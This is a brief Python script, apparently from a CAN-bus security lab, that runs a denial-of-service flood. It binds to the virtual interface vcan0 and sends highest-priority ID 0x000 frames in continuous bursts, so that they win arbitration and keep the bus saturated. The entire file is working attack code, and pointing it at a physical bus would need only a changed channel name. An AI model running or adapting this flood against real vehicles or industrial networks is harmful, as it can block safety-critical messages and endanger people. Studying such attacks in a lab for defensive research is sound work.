import can
import time
import sys

BUS_INTERFACE = 'vcan0'

def main():
    print("🚨 STARTING FLOOD ATTACK (DOS)...")
    print("   Injecting ID 0x000 at Maximum Speed.")
    print("   [Press Ctrl+C to Stop]")

    try:
        bus = can.ThreadSafeBus(channel=BUS_INTERFACE, interface='socketcan')
    except OSError:
        print(f"❌ Error: Could not bind to {BUS_INTERFACE}.")
        return

    # ID 0x000 wins arbitration against everything else
    msg = can.Message(arbitration_id=0x000, data=[0x00]*8, is_extended_id=False)

    try:
        while True:
            # Send bursts to overwhelm the bus
            for _ in range(100):
                bus.send(msg)
            # Tiny sleep to prevent python process lockup, but keeping bus load >90%
            time.sleep(0.001)

    except KeyboardInterrupt:
        print("\n🛑 Flood Stopped.")
    finally:
        bus.shutdown()

if __name__ == "__main__":
    main()
